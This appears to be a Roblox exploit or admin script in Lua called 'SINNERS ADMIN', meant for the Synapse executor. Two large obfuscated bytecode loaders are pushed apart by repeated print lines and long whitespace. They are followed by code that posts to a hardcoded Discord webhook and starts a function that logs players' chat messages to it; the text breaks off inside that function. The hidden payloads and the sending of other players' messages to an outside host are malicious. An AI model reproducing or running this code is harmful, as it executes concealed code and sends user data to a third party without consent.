+ 0)) or ((13261 -9232)<=(540 + 9))) then v241=0 -0;while true do if ((v241==(0 -0)) or ((3384 -(387 + 1513 + 67))>=((3280 + 425) -(155 + 217 + 1471)))) then v81[v83[4 -(639 -(142 + 495))]]=v195;InstrPoint=v83[1760 -(218 + 1539)];break;end end break;end end end break;end end end elseif (((2317 -(844 + 691))==(374 + 408)) and (v84<=36)) then if ((v84==(181 -(40 + 106))) or ((1265 + 3658)<(4771 -(676 + 150)))) then local v164=1129 -(1008 + 121);local v165;local v166;while true do if ((v164==(0 + 0 + 0)) or (3604<((11626 -6532) -2497))) then v165=0 -0;v166=nil;v164=(1822 + 15) -(208 + 1628);end if (((13205 -8272)>4430) and (v164==(1479 -((1258 -395) + 615)))) then while true do if (((1782 + 291)>(1233 -((1399 -(853 + 541)) + 58))) and (v165==0)) then v166=v83[6 -4];v81[v166](v13(v81,v166 + 1 + (188 -(68 + 120)),v83[3]));break;end end break;end end else local v167=1527 -(820 + 269 + 438);local v168;local v169;while true do if (((14810 -10533)>=(1844 + 2432)) and (v167==(1 -0))) then while true do if ((v168==(257 -(31 + 226))) or ((4697 -3512)>1521)) then v169=v83[(1193 -(1097 + 95)) + 1];v81[v169]=v81[v169](v13(v81,v169 + 1 + 0,v83[1620 -(1506 + 111)]));break;end end break;end if (((1241 + 3056)==(2845 + 1452)) and (v167==((0 -0) -0))) then v168=0 -0;v169=nil;v167=991 -(529 + 461);end end end elseif ((v84<=(1891 -(841 + 1013))) or ((6437 -((3624 -2382) + 683))<=(8370 -5175))) then v81[v83[1 + 1]]= -v81[v83[3]];elseif ((((5226 -(1562 + 101)) -(954 + 991))>(2734 -2036)) and (v84>(808 -(686 + 84)))) then v81[v83[556 -(257 + 297)]][v83[2 + 1]]=v81[v83[2 + 2]];elseif (v81[v83[2]] or ((5130 -(803 + 745))<=(1911 + 407))) then v66=v66 + (1 -0);else v66=v83[3];end v66=v66 + (1 -0);break;end end end end A,B=v27(v11(v70));if  not A[1] then local v85=v35[4][v66] or "?";error("Script error at ["   .. v85   .. "]:"   .. A[2]);else return v13(A,2,B);end end;end return v29(v28(),{},v17)();end vv9());break;end if (v0==2) then v7=table.concat;v8=table.insert;v9=getfenv or function()return _ENV;end;v0=3;end if (v0==0) then v1=tonumber;v2=string.byte;v3=string.char;v0=1;end if (v0==1) then v4=string.sub;v5=string.gsub;v6=string.rep;v0=2;end if (4==v0) then v13=unpack or table.unpack;v14=tonumber;v15=nil;v0=5;end end end
--
--
print("SINNERS ADMIN")
---
---
print("SINNERS ADMIN")
---
print("SINNERS ADMIN")

------
print("SINNERS ADMIN")

----
print("SINNERS ADMIN")

print("SINNERS ADMIN")

---------------------
print("SINNERS ADMIN")
---
print("SINNERS ADMIN")


print("SINNERS ADMIN")
------
print("SINNERS ADMIN")
--
print("SINNERS ADMIN")


----------------
print("SINNERS ADMIN")


----------------------------------
print("SINNERS ADMIN")

-----
print("SINNERS ADMIN")
-----------
-------------------------
print("SINNERS ADMIN")


-----------
------------------
print("SINNERS ADMIN")

-----
print("SINNERS ADMIN")

print("SINNERS ADMIN")
----------------------------------------------------------
print("SINNERS ADMIN")






------------------------------------------------
print("SINNERS ADMIN")
















---------------------------------------
print("SINNERS ADMIN")























---------------------------------------
print("SINNERS ADMIN")


































































































































































































































































































































































do local v0=0;local v1;local v2;local v3;local v4;local v5;local v6;local v7;local v8;local v9;local v10;local v11;local v12;local v13;local v14;local v15;while true do if (v0==0) then v1=tonumber;v2=string.byte;v3=string.char;v4=string.sub;v0=1;end if (v0==4) then vv9());break;end if (v0==2) then v9=getfenv or function()return _ENV;end;v10=setmetatable;v11=pcall;v12=select;v0=3;end if (v0==1) then v5=string.gsub;v6=string.rep;v7=table.concat;v8=table.insert;v0=2;end if (v0==3) then v13=unpack or table.unpack;v14=tonumber;v15=nil;function v15(v16,v17)local v18=1;local v19;v16=v5(v4(v16,5),"..",function(v30)if (v2(v30,2)==79) then v19=v1(v4(v30,1,1));return "";else local v62=v3(v1(v30,16));if v19 then local v74=v6(v62,v19);v19=nil;return v74;else return v62;end end end);local function v20(v31,v32,v33)if v33 then local v63=0 -0;local v64;while true do if (v63==(0 + 0)) then v64=(v31/((6 -4)^(v32-(3 -2))))%(2^(((v33-(1 -0)) -(v32-(1804 -((2504 -954) + 253)))) + (4 -3) + (238 -(52 + 186))));return v64-(v64%1);end end else local v65=(1907 -(1904 + 1))^(v32-(1 + 0));return (((v31%(v65 + v65))>=v65) and ((2 -1) + 0)) or (0 + 0);end end local function v21()local v38=v2(v16,v18,v18);v18=v18 + 1;return v38;end local function v22()local v39,v40=v2(v16,v18,v18 + (7 -5));v18=v18 + (192 -(180 + 10));return (v40 * (636 -380)) + v39;end local function v23()local v41,v42,v43,v44=v2(v16,v18,v18 + 3);v18=v18 + (561 -(19 + 538));return (v44 * (16777816 -(297 + 303))) + (v43 * 65536) + (v42 * (212 + 16 + 28)) + v41;end local function v24()local v45=v23();local v46=v23();return (( -((1126 -(1021 + 103)) + 0) * v20(v46,(1597 -(1563 + 15)) + 13)) + 1 + 0) * ((1 + 1)^(v20(v46,25 -4,31) -((2344 -1839) + 518))) * ((((v20(v46,761 -(317 + 443),89 -69) * (2^(61 -29))) + v45)/((1 + 1)^(42 + 10))) + (230 -(220 + 9)));end local function v25(v34)local v47;if  not v34 then v34=v23();if (v34==(0 -0)) then return "";end end v47=v4(v16,v18,(v18 + v34) -(2 -1));v18=v18 + v34;local v48={};for v60=1913 -(855 + 1057), #v47 do v48[v60]=v3(v2(v4(v47,v60,v60)));end return v7(v48);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v49=0 -0;local v50;local v51;local v52;local v53;local v54;local v55;local v56;while true do if (v49==0) then local v71=0 -0;while true do if (v71==(1 + 0)) then v49=1;break;end if (v71==(0 + 0)) then local v93=0;while true do if (v93~=1) then else v71=1;break;end if (v93~=0) then else v50=0;v51=nil;v93=1;end end end end end if (3==v49) then v56=nil;while true do local v75=0 + 0;local v76;while true do if (v75==(0 -0)) then v76=0;while true do if (v76==(1 -0)) then if (v50~=(396 -(341 + 54))) then else local v99=0;while true do if (v99==(1 + 0)) then v56={};v50=2;break;end if (v99==0) then v54={v51,v52,nil,v53};v55=v23();v99=1;end end end if (v50~=(1762 -(1072 + 687))) then else local v100=267 -(260 + 7);local v101;while true do if ((1723 -(590 + 1133))~=v100) then else v101=0;while true do local v102=0;local v103;while true do if (v102==(1183 -(165 + 1018))) then v103=0 -0;while true do if (v103==0) then if (v101~=(1355 -(1113 + 241))) then else return v54;end if (v101==(0 -0)) then local v157=0 -0;local v158;while true do if (v157==0) then v158=0 + 0;while true do if (v158==1) then v101=1583 -(1505 + 77);break;end if (v158==(0 -0)) then local v204=0 + 0;while true do if (v204==(1721 -(277 + 1444))) then for v217=1277 -(698 + 578),v23() do v52[v217-1]=v28();end for v219=1135 -(792 + 342),v23() do v53[v219]=v23();end v204=1;end if (v204==(3 -2)) then v158=4 -3;break;end end end end break;end end end break;end end break;end end end break;end end end break;end if (v76==0) then local v96=0 -0;local v97;while true do if (0==v96) then v97=0;while true do if (v97~=0) then else if (v50~=(1505 -(1458 + 45))) then else local v104=0;while true do if (v104==(0 -0)) then local v109=0 + 0;while true do if (v109~=(0 + 0)) then else local v159=0;while true do if (v159==(1 + 0)) then v109=1 -0;break;end if (v159==0) then for v191=1,v55 do local v192=0;local v193;local v194;local v195;local v196;while true do if (v192==1) then v195=nil;v196=nil;v192=2;end if (v192~=2) then else while true do if (v193==0) then local v221=0;local v222;while true do if ((0 + 0)==v221) then v222=0 + 0;while true do if (v222==1) then v193=1 + 0;break;end if (v222~=(0 + 0)) then else local v237=0;while true do if (v237~=1) then else v222=1;break;end if (v237~=(146 -(54 + 92))) then else v194=0;v195=nil;v237=1 + 0;end end end end break;end end end if (v193==1) then v196=nil;while true do if (v194==(436 -(110 + 325))) then if (v195==(253 -(24 + 228))) then v196=v21()~=(868 -(518 + 350));elseif (v195==2) then v196=v24();elseif (v195~=(848 -(322 + 523))) then else v196=v25();end v56[v191]=v196;break;end if (v194~=(0 -0)) then else local v231=0 + 0;local v232;local v233;while true do if (v231==(91 -(17 + 74))) then v232=0;v233=nil;v231=512 -(45 + 466);end if (v231==(1 + 0)) then while true do if (v232~=(0 -0)) then else v233=0 -0;while true do if (v233~=(0 + 0)) then else local v248=0;while true do if (v248~=(179 -(119 + 60))) then else v195=v21();v196=nil;v248=1;end if (v248~=1) then else v233=55 -(36 + 18);break;end end end if (v233~=(1981 -(1651 + 329))) then else v194=1;break;end end break;end end break;end end end end break;end end break;end if (v192==0) then v193=0;v194=nil;v192=1;end end end v54[56 -(28 + 25)]=v21();v159=1 + 0;end end end if (1==v109) then v104=1;break;end end end if (v104==(1611 -(939 + 671))) then for v150=2 -1,v23() do local v151=0;local v152;local v153;local v154;while true do if (v151==1) then v154=nil;while true do if (v152~=1) then else while true do if (v153~=(0 + 0)) then else v154=v21();if (v20(v154,1 + 0,1 + 0)==0) then local v211=0;local v212;local v213;local v214;local v215;local v216;while true do if (v211~=(2 + 0)) then else v216=nil;while true do if (v212~=0) then else v213=525 -(411 + 114);v214=nil;v212=1 -0;end if (v212~=1) then else local v236=0;while true do if (v236~=(1 + 0)) then else v212=2;break;end if (0==v236) then v215=nil;v216=nil;v236=934 -(168 + 765);end end end if (v212==2) then while true do if (v213~=(1 + 1)) then else if (v20(v215,1020 -(405 + 614),1 + 0)~=(1 + 0)) then else v216[779 -(280 + 497)]=v56[v216[2 -0]];end if (v20(v215,1677 -(858 + 817),2)==1) then v216[3]=v56[v216[1966 -(272 + 1691)]];end v213=11 -8;end if (1~=v213) then else local v240=0;while true do if (v240~=(283 -(112 + 171))) then else v216={v22(),v22(),nil,nil};if (v214==0) then local v249=0 -0;while true do if (v249==(0 + 0)) then v216[1 + 2]=v22();v216[4]=v22();break;end end elseif (v214==1) then v216[1722 -(74 + 1645)]=v23();elseif (v214==2) then v216[738 -(309 + 426)]=v23() -((2 -0)^16);elseif (v214==3) then local v254=0;while true do if (v254~=0) then else v216[3]=v23() -(2^16);v216[8 -4]=v22();break;end end end v240=2 -1;end if (v240~=1) then else v213=1 + 1;break;end end end if (v213==(1739 -(1216 + 523))) then local v241=925 -(115 + 810);while true do if (v241~=0) then else v214=v20(v154,2,2 + 1);v215=v20(v154,4,6);v241=1 + 0;end if (v241==1) then v213=1 -0;break;end end end if (v213==(104 -(90 + 11))) then if (v20(v215,3,3)==(918 -(707 + 210))) then v216[4]=v56[v216[3 + 1]];end v51[v150]=v216;break;end end break;end end break;end if (v211==(0 -0)) then v212=290 -(20 + 270);v213=nil;v211=1997 -(1681 + 315);end if (v211~=1) then else v214=nil;v215=nil;v211=2 + 0;end end end break;end end break;end if (0==v152) then v153=0;v154=nil;v152=1 + 0;end end break;end if (v151==(437 -(142 + 295))) then v152=1883 -(1178 + 705);v153=nil;v151=3 -2;end end end v50=8 -5;break;end end end if (v50==0) then local v105=0;local v106;local v107;while true do if (v105~=(3 -2)) then else while true do if (v106~=0) then else v107=0 + 0;while true do if (v107==(0 + 0)) then local v184=634 -(174 + 460);while true do if (v184~=(0 + 0)) then else v51={};v52={};v184=1799 -(15 + 1783);end if ((1 + 0)~=v184) then else v107=1;break;end end end if (v107~=(1 + 0)) then else v53={};v50=1 + 0;break;end end break;end end break;end if (v105~=0) then else v106=0;v107=nil;v105=1;end end end v97=1 + 0;end if (v97~=1) then else v76=1 + 0;break;end end break;end end end end break;end end end break;end if (v49~=(2 -1)) then else local v72=0;while true do if (v72~=0) then else v52=nil;v53=nil;v72=1228 -(1134 + 93);end if (v72==1) then v49=261 -(218 + 41);break;end end end if (v49==2) then local v73=1352 -(993 + 359);while true do if ((981 -(99 + 881))~=v73) then else v49=2 + 1;break;end if (v73==(0 + 0)) then v54=nil;v55=nil;v73=1149 -(1146 + 2);end end end end end local function v29(v35,v36,v37)local v57=v35[1];local v58=v35[2];local v59=v35[3];return function(...)local v66=1;local v67= -1;local v68={...};local v69=v12("#",...) -1;local function v70()local v77=v57;local v78=Const;local v79=v58;local v80=v59;local v81=v27;local v82={};local v83={};local v84={};for v90=0 + 0,v69 do if ((((665 + 169) -430)==(539 -(14 + 121))) and (v90>=v80)) then v82[v90-v80]=v68[v90 + (2 -1)];else v84[v90]=v68[v90 + (361 -(126 + 234))];end end local v85=(v69-v80) + (1627 -(1222 + 404));local v86;local v87;while true do local v91=0 -0;local v92;while true do if (((6973 -4044)>=(1891 -(1069 + 559))) and (v91==(0 -0))) then v92=0 -0;while true do if ((v92==(1471 -(1036 + 435))) or ((2403 -(550 + 1427))>=(6605 -3206))) then local v98=0 -(0 + 0);while true do if (((3401 + 1096)>=(2490 + (3925 -2433))) and (v98==(0 -0))) then v86=v77[v66];v87=v86[2 -1];v98=1 + 0;end if ((v98==(1 + 0)) or ((1791 + 382)>(3888 + 692))) then v92=1 + 0;break;end end end if ((v92==(1 + 0)) or ((2743 -(2342 -(426 + 324)))==(3838 -(1035 + 733)))) then if ((v87<=(444 -(297 + 134))) or ((13848 -10128)>(4830 -(368 + 724)))) then if (((6481 -2683)==(354 + 3444)) and (v87<=(6 + 0))) then if (((7225 -5065)==(2556 -(285 + 111))) and (v87<=(551 -(224 + 325)))) then if ((v87<=(1106 -(16 + 1090))) or ((353 + 62)>=(2262 -(36 + 813)))) then if ((v86[2 -0]==v84[v86[5 -1]]) or ((2347 + 2049)<(1976 + 495))) then v66=v66 + (1202 -(1176 + 25));else v66=v86[1 + 2];end elseif (((5677 -2741)==(5210 -2274)) and (v87==(1345 -(21 + 1323)))) then local v110=0 + 0;local v111;local v112;local v113;while true do if ((v110==(1 + 0)) or ((2049 -(280 + 486))==(12764 -8814))) then v113=nil;while true do if ((v111==(1 + 0)) or ((1907 -(538 + (1905 -(1486 + 351))))>(3296 -(720 + 99 + 27)))) then v84[v112 + (1103 -(987 + (330 -215)))]=v113;v84[v112]=v113[v86[966 -(371 + 591)]];break;end if (((4926 -(1296 + (422 -278)))>=(2427 + 659)) and (v111==(0 + 0))) then local v187=0 + 0;local v188;while true do if (((934 + 1067)>(370 + 232)) and (v187==(0 + 0))) then v188=0 -0;while true do if ((((7087 -4224) -(43 + (499 -(86 + 315))))==((5730 -(662 + 836)) -(848 + 662))) and (v188==(1782 -(511 + 1270)))) then v111=1509 -(1139 + 369);break;end if ((v188==(0 + 0)) or ((10583 -7931)<(581 + 1512))) then v112=v86[1773 -(59 + 1712)];v113=v84[v86[439 -(254 + 182)]];v188=1815 -((3401 -(1156 + 823)) + 392);end end break;end end end end break;end if (((578 -326)==(344 -((213 -124) + 3))) and (v110==(301 -(39 + 262)))) then local v160=629 -(194 + 435);while true do if (((1608 -(1021 + 471))<(1671 -(85 + 554 + 624))) and (v160==(1509 -(147 + 1361)))) then v110=1228 -(261 + 966);break;end if (((1832 -403)<=(1347 + 2524)) and (v160==(0 + (462 -(204 + 258))))) then v111=676 -(406 + 270);v112=nil;v160=2 -1;end end end end else for v155=v86[(1273 -(335 + 936)) + 0],v86[1 + 2] do v84[v155]=nil;end end elseif ((v87<=(3 + 1)) or ((108 + 840)>(1656 + 2578))) then if (((5343 -(45 + 314))>(244 + 128)) and (v87==3)) then do return;end else local v114=0 -0;local v115;local v116;while true do if (((198 + 3762)<(9010 -4911)) and (v114==((836 -532) -(167 + 136)))) then for v165=(2 -1) + 0, #v83 do local v166=0 + 0;local v167;while true do if ((v166==((496 + 1197) -(1304 + 389))) or ((16999 -12312)<(173 + 191))) then v167=v83[v165];for v197=0 + 0, #v167 do local v198=0 -0;local v199;local v200;local v201;local v202;while true do if ((v198==(1 -0)) or ((401 -(7 + 213 + 159))==(239 + 146))) then v201=nil;v202=nil;v198=8 -6;end if ((v198==(698 -(233 + 465))) or ((3426 -1644)<=(304 + 1258))) then local v206=0 + 0;while true do if (((0 + 0)==v206) or ((495 -265)>(5082 -(959 + 125)))) then v199=0 + 0;v200=nil;v206=2 -1;end if (((9800 -6070)>(10105 -6700)) and (v206==(1205 -(180 + 1024)))) then v198=(2 -1) -0;break;end end end if ((v198==(1625 -(956 + 667))) or ((2531 + 1060)==(2861 + 1464))) then while true do if ((((1480 -(57 + 242)) -(90 + 809))==(2261 -(1168 + 811))) and (((2363 -(733 + 895)) -(681 + 36 + 18))==v199)) then local v226=566 -((972 -543) + 137);local v227;while true do if ((((1739 -(780 + 343)) + 2103)>=(1483 + 45)) and (v226==(0 + 0))) then v227=0 + 0;while true do if ((v227==(1 + 0 + (1506 -(921 + 585)))) or ((2680 -1849)==(5450 -(935 + 872)))) then v199=2 -1;break;end if ((v227==(0 + 0)) or ((4047 -(28 + 39))>=(5642 -(683 + 420)))) then local v238=0 + 0;while true do if (((4749 -(142 + 997))<=(2324 + 2348)) and (v238==((1 + 3) -3))) then v227=1 + 0;break;end if ((v238==(0 -0)) or ((10094 -6315)==(253 -50))) then v200=v167[v197];v201=v200[1 + 0];v238=1 + 0;end end end end break;end end end if ((v199==(2 -1)) or ((12942 -8196)<=(12314 -8180))) then v202=v200[(80 + 290) -(34 + 334)];if (((524 + (3864 -(661 + 1103)))>(1588 -1121)) and (v201==v84) and (v202>=v115)) then local v234=0 + 0;local v235;while true do if (((3295 -1595)<=(3057 + 249)) and (v234==(952 -(42 + 910)))) then v235=0 + 0;while true do if ((v235==(0 -0)) or ((4384 -1914)>(1308 + 1874 + 207))) then v116[v202]=v201[v202];v200[1 + 0]=v116;break;end end break;end end end break;end end break;end end end break;end end end break;end if (((1983 -1196)<=(1693 + 276)) and (v114==(0 + 0))) then local v161=0;while true do if (((5306 -(654 + 978))==(4929 -(805 + 450))) and (v161==(1041 -((3728 -2750) + 62)))) then v114=162 -(82 + 79);break;end if ((v161==(0 -0)) or ((19649 -15423)<(49 + 134))) then v115=v86[1449 -(99 + 1348)];v116={};v161=(1 -0) -0;end end end end end elseif ((v87==(9 -4)) or ((2947 -(543 + 514))>=(3164 + 98))) then local v117=0 + 0;local v118;local v119;local v120;while true do if ((v117==(313 -(246 + 67))) or ((6897 -4519)>=(1729 + 2069))) then v118=(1616 -(408 + 1208)) -0;v119=nil;v117=881 -(786 + 94);end if (((4019 -787)>(1711 -(2143 -(704 + 381)))) and (v117==(2 -1))) then v120=nil;while true do if (((1938 -((1836 -(118 + 36)) + 255))==v118) or ((2723 + 1470)<=(1113 -653))) then while true do if (((0 + 0)==v119) or ((4898 -2682)<=(1236 -593))) then v120=v86[2];v84[v120]=v84[v120](v84[v120 + (1767 -(394 + 1372))]);break;end end break;end if (((0 + 0)==v118) or ((371 + 1934)<=(3590 -(901 + 534)))) then local v189=1152 -(1140 + 12);while true do if ((v189==(0 + 0)) or ((1056 -641)==(2462 + 719))) then v119=0 + 0;v120=nil;v189=1 -0;end if ((((784 + 5050) -3794)<=(4012 -1469)) and (v189==(2 -1))) then v118=1 + 0;break;end end end end break;end end else local v121=1385 -(1007 + 378);local v122;while true do if (((215 + 3484)<=(1746 + 1978)) and (v121==(1295 -(173 + 1122)))) then v122=v86[2 + 0];v84[v122]=v84[v122](v13(v84,v122 + (1 -(0 -0)),v86[1936 -(326 + 1607)]));break;end end end elseif (((3203 -2381)==(2254 -1432)) and (v87<=(30 -21))) then if ((v87<=(2 + 5)) or ((5386 -2643)>(417 + 2395))) then if (((6133 -4080)>=(1482 -1009)) and (v84[v86[877 -(149 + 726)]]~=v86[641 -(305 + (1722 -(385 + 1005)))])) then v66=v66 + (567 -(51 + 515));else v66=v86[3 -0];end elseif ((v87>((1534 -945) -(89 + 492))) or ((5733 -(180 + 734))<=(357 + 1042))) then v84[v86[5 -3]]=v37[v86[5 -2]];else local v124=1718 -(576 + 1142);local v125;while true do if ((818<=(5286 -(73 + 701))) and (v124==(0 + 0))) then v125=v86[(2 -1) + 1];v84[v125](v13(v84,v125 + 1 + 0,v86[(4 -3) + (7 -5)]));break;end end end elseif ((v87<=(6 + 5)) or ((3076 -(665 + 44))==(1027 + 2751))) then if (((12 + 4044 + 299)>(2718 + 1503)) and (v87>(29 -19))) then local v126=0 + 0 + 0;local v127;local v128;while true do if ((v126==1) or ((1478 + 1343)<(1849 -(1242 + 361)))) then while true do if (((6215 -(383 + 1490))>=(12935 -9776)) and (v127==(0 + 0))) then v128=v86[1551 -(138 + 1411)];do return v13(v84,v128,v128 + v86[2 + 1]);end break;end end break;end if ((v126==(0 -0)) or ((10221 -7012)<(458 -((784 -504) + (119 -71))))) then local v163=0 -0;while true do if ((v163==(0 + 0)) or ((5002 -(1326 + 519))<(2765 -1158))) then v127=0 -0;v128=nil;v163=1 + 0;end if ((v163==(3 -2)) or (1176>=(7170 -2288))) then v126=1 + 0;break;end end end end else v84[v86[690 -(428 + 260)]]={};end elseif (((6722 -4188)==(3281 -(300 + 447))) and (v87>(1232 -(20 + 258 + 942)))) then v84[v86[5 -3]]=v86[3 + 0]~=(252 -(208 + 44));else v66=v86[641 -(222 + 416)];end elseif (((3184 -1282)==(7034 -5132)) and (v87<=((14 -7) + 13))) then if (((4325 -(38 + 819))<=(4296 -(33 + 1 + 483))) and (v87<=(13 + 3))) then if ((v87<=(6 + 8)) or ((265 + 3164)>(2808 + 2136))) then do return v84[v86[2 -0]];end elseif ((v87>(13 + 2)) or (4810<(2652 -(343 + 800)))) then local v131=411 -(124 + 287);local v132;local v133;while true do if ((v131==(1 -0)) or ((3118 -(1370 + 150))>=((9196 -5487) + 887))) then while true do if ((v132==(0 + 0)) or ((983 -(431 + 281 + 118))>(18 + 983 + 788))) then v133=v86[(645 -(51 + 592)) + 0];do return v13(v84,v133,v67);end break;end end break;end if ((v131==(0 + 0)) or ((7907 -5739)<(3995 -2406))) then v132=1132 -(606 + 526);v133=nil;v131=1 + 0;end end elseif (((90 + (2190 -(475 + 831)))<=(731 + 1769)) and v84[v86[2]]) then v66=v66 + ((1706 -(7 + 26)) -(1412 + 260));else v66=v86[14 -11];end elseif (((3013 -(910 + 175))>=(1000 + 7)) and (v87<=((134 -(10 + 115)) + 9))) then if (((4129 -976)<=((6118 -(191 + 275)) -1665)) and (v87==(789 -(625 + 147)))) then v84[v86[(594 + 1283) -(1818 + 57)]]=v36[v86[128 -(74 + 51)]];else v84[v86[4 -2]]=v86[(472 -(206 + 258)) -5];end elseif ((v87>(368 -(274 + (271 -196)))) or ((1581 -(11 + 1448))>=(68 + 3287))) then local v136=0 + 0;local v137;local v138;while true do if (((2142 + 2644)>=((3524 -(598 + 1287)) -983)) and (v136==(458 -(456 + 1)))) then while true do if (((1182 + (2217 -(715 + 509)))<(10109 -7584)) and (v137==(0 + 0))) then v138=v86[2 + 0];do return v84[v138](v13(v84,v138 + (2 -1),v86[8 -5]));end break;end end break;end if (((248 + 812 + 1465)==(3726 -1201)) and (v136==(0 + 0))) then v137=0 -(1710 -(784 + 926));v138=nil;v136=3 -2;end end else v37[v86[231 -((91 -29) + 166)]]=v84[v86[1293 -((1619 -(322 + 36)) + 30)]];end elseif (((608 + 373)<=(4650 -2958)) and (v87<=(84 -61))) then if (((1967 -(520 + 579))<(5122 -3365)) and (v87<=(1814 -(1791 + 2)))) then v84[v86[1076 -(77 + 997)]][v86[1131 -(1078 + 50)]]=v84[v86[1336 -(799 + 150 + 383)]];elseif ((v87==(15 + (1609 -(641 + 961)))) or (((3311 -(892 + 92)) + 69)>=(4372 -(195 + 114 + 98)))) then v84[v86[5 -3]]=v84[v86[2 + 1]];else local v141=1449 -(703 + 746);local v142;local v143;local v144;while true do if (((7716 -4033)==(4481 -(496 + 302))) and (v141==(1 + 0 + 0))) then v144=nil;while true do if (((173 + 962)<=(3872 -1755)) and (v142==((2119 -(598 + 309)) -(977 + 234)))) then while true do if (((4037 -2137)<(4301 -2213)) and ((291 -(64 + 191 + 36))==v143)) then v144=v84[v86[2 + (5 -3)]];if (((1532 + 1043)<=(5055 -(1121 + 630))) and  not v144) then InstrPoint=InstrPoint + (1943 -(486 + 1456)) + (0 -0);else local v207=0 -0;local v208;local v209;while true do if (((7816 -(4157 -(648 + 35)))==(1008 + 3334)) and (v207==(519 -(59 + 459)))) then while true do if (((9983 -6478)<(16232 -(25445 -13537))) and (v208==(0 -0))) then v209=0 -0;while true do if ((v209==(1395 -(1018 + 377))) or ((499 + 636 + 270)>(13891 -9159))) then v84[v86[1 + 1]]=v144;InstrPoint=v86[1392 -(822 + 245 + 202 + 120)];break;end end break;end end break;end if ((v207==(0 -0)) or ((2858 -(382 + 1570))>=(5637 -(579 + 771 + 103)))) then v208=0 -0;v209=nil;v207=1672 -(636 + 1035);end end end break;end end break;end if ((v142==(241 -((294 -(57 + 15)) + 19))) or ((2291 + 806)>=(4222 -(537 + 155)))) then local v190=0 -0;while true do if (((7394 -4810)>(5416 -3844)) and ((1 -0)==v190)) then v142=2 -1;break;end if ((v190==(0 + 0)) or ((111 + 1247 + 890)==(1104 -737))) then v143=(0 -0) -0;v144=nil;v190=592 -(262 + 329);end end end end break;end if ((v141==(0 + 0)) or (4241<((5940 -(1371 + 132)) -(317 + 1308)))) then v142=0 -0;v143=nil;v141=1;end end end elseif ((v87<=(43 -(47 -29))) or ((14367 -9629)==(221 + 3825))) then if (((5533 -(667 + 794))>=(3772 -(43 + (913 -(203 + 557))))) and (v87>(111 -87))) then local v145=(0 + 0) -(1744 -(877 + 867));local v146;local v147;local v148;while true do if ((v145==0) or ((1967 -(657 + 1241))>=(3626 -(2148 -(360 + 605))))) then v146=v79[v86[1 + 2]];v147=nil;v145=1248 -(485 + 762);end if (((2002 + 2420)>=(7539 -4370)) and (v145==((3 + 1) -2))) then for v168=1140 -(606 + (930 -(19 + 378))),v86[4 + 0] do local v169=1381 -(330 + 1051);local v170;local v171;local v172;while true do if ((((2492 + 632) -(27 + 949))==(2846 -((758 -550) + 490))) and ((679 -(298 + 380))==v169)) then v172=nil;while true do if (((3528 -(2772 -(438 + 707)))==(3662 -(993 + 768))) and ((1093 -(967 + (548 -423)))==v170)) then while true do if ((1520<(5066 -(581 + 454))) and (v171==(0 + 0))) then local v223=317 -(181 + 136);local v224;while true do if (((683 -414)<(1780 + 3112)) and (0==v223)) then v224=0;while true do if (((68 + 3609)>=(2449 -(1169 + 487))) and ((1138 -(583 + 555))==v224)) then v66=v66 + (1446 -(152 + 1293));v172=v77[v66];v224=1116 -(139 + 740 + 236);end if ((v224==(1 -0)) or ((313 + 1235 + 479)<(7011 -5243))) then v171=1 -0;break;end end break;end end end if (((678 -(100 + 577))==v171) or ((1064 + 169 + 520)>(3811 -(485 + 329)))) then if ((((3003 -(106 + 1222)) + (9530 -6518))>(2039 -(855 + 454))) and (v172[1616 -(399 + 1216)]==(2 + 20))) then v148[v168-(1 -0)]={v84,v172[7 -4]};else v148[v168-(1 + 0)]={v36,v172[3 + 0]};end v83[ #v83 + (1333 -(211 + 74 + 1047))]=v148;break;end end break;end if (((1876 + 1476)==(4756 -(1109 + 295))) and (v170==(1055 -(635 + 48 + 372)))) then v171=1825 -(1751 + 74);v172=nil;v170=1045 -((419 -227) + 852);end end break;end if ((v169==0) or ((12036 -8378)==(111 + 1029))) then v170=0 + 0;v171=nil;v169=852 -(291 + 560);end end end v84[v86[1 + 1]]=v29(v146,v147,v37);break;end if ((4809<((30422 -24026) -(944 + 518))) and ((97 -(49 + 47))==v145)) then v148={};v147=v10({},{__index=function(v173,v174)local v178=0 -(904 -(854 + 50));local v179;local v180;while true do if (((8787 -5274)<=(984 + 3580)) and (((266 -(166 + 100)) -(0 + 0))==v178)) then v179=0 -0;v180=nil;v178=(599 -(55 + 543)) + 0;end if (((2035 + 1466)<(5949 -(787 + (1736 -1088)))) and (v178==(1 + 0))) then while true do if ((v179==(0 -0)) or (927>=(3079 + 452))) then local v210=0 -0;while true do if (((5511 -(4585 -(575 + 320)))<(5228 -(63 + 923))) and (v210==(0 -0))) then v180=v148[v174];return v180[1 + 0 + 0][v180[2]];end end end end break;end end end,__newindex=function(v175,v176,v177)local v181=350 -(7 + 164 + 179);local v182;while true do if (((3171 -(1867 -681))==(3423 -(1512 -(34 + 40)))) and (v181==(488 -(183 + 305)))) then v182=v148[v176];v182[635 -(459 + 175)][v182[7 -5]]=v177;break;end end end});v145=5 -3;end end else v84[v86[2]]=v84[v86[9 -6]][v86[10 -6]];end elseif (((3077 -(1352 + 544))<=(7250 -3507)) and (v87>(944 -(875 + (94 -51))))) then if ((((22419 -16835) -(1857 + 11))>3425) and (v84[v86[1089 -(295 + (1448 -(446 + 210)))]]==v86[156 -(149 + 3)])) then v66=v66 + (2 -1);else v66=v86[7 -4];end elseif (((13904 -9449)>=(1434 -(762 + 512))) and  not v84[v86[1889 -(706 + 1181)]]) then v66=v66 + (1 -0);else v66=v86[1268 -(481 + 784)];end v66=v66 + (1677 -(913 + 763));break;end end break;end end end end A,B=v27(v11(v70));if  not A[1] then local v88=0;local v89;while true do if (v88==0) then v89=v35[4][v66] or "?";error("Script error at ["   .. v89   .. "]:"   .. A[2]);break;end end else return v13(A,2,B);end end;end return v29(v28(),{},v17)();end v0=4;end end end











































































































local marketplaceService = game:GetService("MarketplaceService")
 
local isSuccessful, info = pcall(marketplaceService.GetProductInfo, marketplaceService, Game.PlaceId)
if isSuccessful then
 
local wh = 'https://discord.com/api/webhooks/1013726823512813668/hpKSdbjuf0_tTsRjDy5gllQ0XKqjpsa1AstXEWXhxaTw2rcuLH64b5Pt7lQpESwpA9pR'
local embed1 = {
       ['title'] = 'Beginning of Message logs on '..info.Name.." at "..tostring(os.date("%m/%d/%y at time %X"))
   }
local a = syn.request({
   Url = wh,
   Headers = {['Content-Type'] = 'application/json'},
   Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed1}, ['content'] = ''}),
   Method = "POST"
})
function logMsg(Webhook, Player, Message)
   local embed = {
